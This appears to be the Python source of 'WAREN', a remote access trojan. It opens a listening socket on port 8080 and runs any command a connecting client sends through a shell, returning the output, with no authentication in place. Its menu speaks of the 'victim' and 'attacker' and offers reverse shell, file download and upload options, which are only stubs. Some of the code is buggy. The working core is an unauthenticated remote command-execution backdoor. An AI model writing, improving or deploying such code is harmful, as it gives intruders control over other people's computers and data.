import socket
import subprocess
import argparse


banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⠴⡿⠓⠶⠾⠿⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡖⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿⠖⠻⠷⡶⣮⡙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⢀⣚⡯⠉⠀⠀⠀⠀⠀⠀⠀⠉⠛⢷⣄⣀⣀⣀⣀⣠⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠟⠀⠀⠀⠀⠀⠀⠀⢀⣰⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠉⠉⠛⠿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⣾⣉⠳⠄⠀⠀⠀⠀⠀⠀⠀⠉⠻⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣅⡀⠉⠁⠀⠀⠀⠀⢠⣴⣤⡀⠀⠀⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣳⣾⠿⠁⠀⠀⠀⠀⠀⠀⠻⠿⠿⠟⠀⠀⠀⠀⠀⠉⠻⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠖⠋⠁⢀⣼⡧⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢶⡿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣴⡒⠒⠶⣤⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠏⠁⠀⢀⣠⣼⡟⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣤⠀⠀⠀⠤⠖⠚⠉⠉⣀⡠⠤⠒⢲⡆⠁⢀⡴⢩⡿⢤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⠋⠀⢀⣴⠞⠋⠉⢸⡇⠀⠀⠀⠀⠀⠀⠀⢽⣟⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠴⠋⠀⠀⠀⠀⠀⢀⡠⠖⠋⠁⢀⣤⣾⣥⠤⠴⠛⠋⠉⠙⣆⠉⠢⡄
⠀⠀⠀⠀⠀⣠⠟⠁⢠⡾⠋⠁⠀⠀⠀⣼⡇⠀⡀⠀⠀⠀⠀⠀⢰⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠋⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠈
⠀⠀⠀⠀⣴⠋⢀⡴⠋⠀⠀⠀⠀⠀⠀⣿⠿⢛⣣⣄⣀⡀⠀⠀⠀⢨⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢠⣄⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀
⠀⠀⠀⣼⠇⢀⡟⠁⠀⠀⠀⠀⠀⠀⠰⣿⠀⠈⠈⢻⣟⠉⠉⠉⠉⠉⠛⠻⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⢠⣶⠏⢸⠛⠛⠒⢲⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⡟⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⡀⣿⣷⣄⠀⠀⠀⠀⠀⠀⠙⠿⣿⣀⢀⣀⣤⣄⠀⠀⠀⠀⣀⣀⣾⣿⣿⣄⣠⣏⠀⠀⠀⠺⣯⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣸⡇⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠘⣷⣤⢹⣄⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠻⣯⣤⣴⣦⣾⠷⣿⡋⠀⠀⠈⠉⢹⣿⣦⣿⠛⢷⣬⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡏⠙⢿⠟⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣯⡀⠀⠀⠈⢿⡷⣦⡀⠀⢸⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⡇⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡏⠀⣇⠘⡆⢳⣬⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣸⡇⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡾⢻⣶⠿⣶⡏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⠃⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠉⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⣏⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⣿⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

────────────────────────────────[ WAREN ]─────────────────────────────────
                 Remote Access :: Shell :: Control Channel            
──────────────────────────────────────────────────────────────────────────
"""


menu = """
1: Execute command
2: get reverse shell
3: download file from victim
4: upload file from attacker
5: leave
"""


HelpMenu = """
Commands:
    execute\tWill execute a command
    reverse\tWill start a shell on the victim
    download\tWill download a file from victim to attacker
    upload\tWill upload a file from attacker to victim
    leave\tClose connection with server
    help\tSend help about a command
"""


def StartSocket(ip, port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    s.bind((ip, port))
    s.listen(5)
    c, addr = s.accept()
    return c, addr

def ParseArg(string, parameter):
    parameter += " "
    
    splitted1 = string.split(parameter, 1) # splitting then saving arg
    
    if len(splitted1) < 2:
        return 1 # error out due to low arguments
    
    splitted1 = splitted1[1]

    if splitted1.count('"') > 1: # There's an occurence of ""
        # Grabbing index of only what's inside of the arg
        StringStart = splitted1.find('"') + 1
        StringEnd = splitted1.find('"', StringStart)
        return splitted1[StringStart:StringEnd] 

    splitted2 = splitted1.split(" ", 1)
    
    if len(splitted2) == 0:
        return 2 # error out due to failure parsing
    
    return splitted2[0]

def ReceiveOption():
    c.send(b"Waren >> ")
    option = c.recv(2048) 
    if len(option) > 1:
        return option.decode().strip()
    return "0"

def SendHelp(option):
    option = option.split()

    if len(option) == 1: # no argument is provided
        c.send(HelpMenu.encode())
        return
    match option[1]:
        case b"execute":
            c.send(b"""Execute a command
                    Flag: -c command""")
        case b"reverse":
            c.send(b"reverse")
        case b"download":
            c.send(b"download")
        case b"upload":
            c.send(b"upload")
        case b"leave":
            c.send("leave")
        case b"help":
            SendHelp(option)
        case _:
            c.send(b"Unknown option try: help")


def close_server():
    print("Received stop server option")
    print("Closing...")
    c.send(b'Closing...\n')
    c.close()

def auth_user():
    c.send(b"Login with the password")

def ExecuteCommand(command):
    ParsedCommand = ParseArg(command, "-c")

    if ParsedCommand == 1: # No arguments provided
        c.send(b"to execute a command: execute -c command")
        return
    if ParsedCommand == 2:
        c.send(b"Failure to Parse command, Maybe check your syntax?")
        return

    try:
        output = subprocess.check_output(ParsedCommand, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    
    c.sendall(output)

#def get_reverse_shell()

if __name__ == "__main__":
    
    status = True
    while True:
        c, addr = StartSocket('', 8080)
        c.send(banner.encode())
        while status == True:
            print("socket from: {}".format(addr))

            c.send(menu.encode())
            
            option = ReceiveOption()
            match option.split()[0]: # match first word to
                case "execute":
                    ExecuteCommand(option)
                case "reverse":
                    c.send(b"reverse")
                case "download":
                    c.send(b"download")
                case "upload":
                    c.send(b"upload")
                case "leave":
                    status = False
                    c.shutdown(socket.SHUT_RDWR)
                    c.close()
                    #close_server()
                    break
                case "help":
                    SendHelp(option)
                case _:
                    c.send(b"Unknown option try: help\n")
